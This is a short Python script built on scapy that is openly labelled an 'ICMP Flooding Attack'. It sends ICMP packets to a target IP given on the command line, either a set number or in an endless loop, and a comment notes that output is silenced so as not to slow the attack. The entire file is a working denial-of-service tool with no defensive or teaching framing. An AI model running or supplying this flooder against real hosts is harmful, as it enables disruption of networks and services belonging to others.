# Usage : python imcp_flood.py -t <target_ip> -c <count>

from scapy.all import *
import argparse

def icmp_flood(target_ip, count):
    if count == 0:
        while True:
            # Send ICMP packets to the target IP
            send(IP(dst=target_ip)/ICMP(), verbose=0) # Verbose = 0 to avoid printing output and slowing down the attack
    else:
        for i in range(count):
            # Send ICMP packets to the target IP
            send(IP(dst=target_ip)/ICMP(), verbose=0)

def main():
    parser = argparse.ArgumentParser(description='ICMP Flooding Attack')
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    parser.add_argument('-c', '--count', help='Number of packets to send (0 for infinite)', required=False, type=int, default=1000)
    args = parser.parse_args()

    icmp_flood(args.target, args.count)
        
if __name__ == '__main__':
    main()